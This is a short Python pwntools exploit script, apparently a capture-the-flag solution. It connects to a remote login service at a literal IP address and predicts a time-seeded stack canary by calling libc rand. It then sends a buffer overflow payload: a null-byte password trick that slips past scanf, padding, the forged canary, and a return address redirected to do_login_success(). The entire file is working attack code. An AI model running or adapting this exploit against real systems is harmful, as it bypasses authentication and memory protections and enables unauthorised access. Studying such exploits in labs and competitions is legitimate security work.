from pwn import *
from ctypes import *

libc = CDLL("libc.so.6")
libc.srand(libc.time(0))
rnd = libc.rand()
print(hex(rnd))

io = remote('45.76.91.112', 10053)
io.recvuntil(b'Enter password:')

junk_length = 44
desired_pass_length = 8
trick_password = 'a' * desired_pass_length + '\x00' # scanf doesn't stop at '\0' (because it's not considered whitespace)
junk = bytes(trick_password + 'a' * (junk_length - len(trick_password)), 'utf-8')

canary = rnd.to_bytes(4, 'little')
frame_pointer = b'a' * 8
new_ret_value = p64(0x0004011F6) # Address of do_login_success()
input = junk + canary + frame_pointer + new_ret_value

io.sendline(input)
io.interactive()
